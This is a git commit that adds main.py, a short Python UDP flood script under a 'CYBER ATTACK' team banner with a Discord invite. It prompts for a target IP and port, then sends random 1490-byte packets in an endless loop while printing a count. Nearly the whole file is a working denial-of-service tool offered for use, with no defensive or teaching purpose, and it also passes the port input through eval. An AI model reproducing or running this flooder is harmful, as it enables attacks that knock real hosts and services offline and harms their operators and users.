b0953762024679f1b0fadf6fb2d5c2e5a208219f
Crafset <82468619+Crafset@users.noreply.github.com>
2021-08-21 16:51:14 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,25 @@
+import socket
+import random
+sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+print
+print("___________________    _____  __________________________________________")
+print("\_   ___ \______   \  /  _  \ \_   _____/   _____/\_   _____/\__    ___/")
+print("/    \  \/|       _/ /  /_\  \ |    __) \_____  \  |    __)_   |    ")
+print("\     \___|    |   \/    |    \|     \  /        \ |        \  |    |")
+print(" \______  /____|_  /\____|__  /\___  / /_______  //_______  /  |____|")
+print("        \/       \/         \/     \/          \/         \/")
+print ("Crafset  : AZERT-HACK")
+print ("Team : CYBER ATTACK ")
+print ("Discord : https://discord.gg/GcQAWW4kUZ")
+print
+print("______________________________________")
+ip = input("Enter IP Adress: ")
+port = eval(input("Enter Port: "))
+sent = 0
+
+while True:
+    sock.sendto(bytes,(ip,port))
+    sent = sent +1
+    print("Sent %s packet to %s through port : %s"%(sent,ip,port))
